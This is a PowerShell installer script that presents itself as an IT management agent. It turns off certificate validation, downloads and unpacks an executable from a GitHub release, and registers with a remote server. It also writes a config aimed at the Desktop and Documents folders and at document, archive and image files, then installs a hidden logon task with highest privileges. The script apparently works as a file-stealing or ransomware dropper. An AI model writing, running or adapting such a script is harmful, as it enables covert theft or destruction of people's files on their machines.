$ErrorActionPreference = 'Stop'
$dir  = "$env:LOCALAPPDATA\itmgn"
$exe  = "$dir\itagnt.exe"
$zip  = "$dir\itagnt.zip"
$cfg  = "$dir\agent.json"
$base = "https://rmm.xartechnology.cloud"

# Accept self-signed / Sophos-intercepted certificates
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAll : ICertificatePolicy {
        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol  = [System.Net.SecurityProtocolType]::Tls12

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1.0/itagnt.zip" -OutFile $zip -UseBasicParsing
Expand-Archive -Path $zip -DestinationPath $dir -Force
Remove-Item $zip -Force

$r = Invoke-RestMethod -Uri "$base/api/register" -Method POST -ContentType "application/json" -UseBasicParsing

@{
    ServerUrl        = $base
    AgentId          = $r.agent_id
    TargetFolders    = @(
        [Environment]::GetFolderPath("Desktop"),
        [Environment]::GetFolderPath("MyDocuments")
    )
    TargetExtensions = @(".doc",".docx",".xls",".xlsx",".ppt",".pptx",
                         ".pdf",".txt",".csv",".zip",".rar",".jpg",".jpeg",".png")
} | ConvertTo-Json -Depth 3 | Out-File -FilePath $cfg -Encoding UTF8 -Force

schtasks /delete /tn "itmgn" /f 2>$null | Out-Null
schtasks /create /tn "itmgn" /tr "`"$exe`"" /sc ONLOGON /rl HIGHEST /f | Out-Null

Start-Process -FilePath $exe -WindowStyle Hidden
Write-Host "Done. Agent ID: $($r.agent_id)"
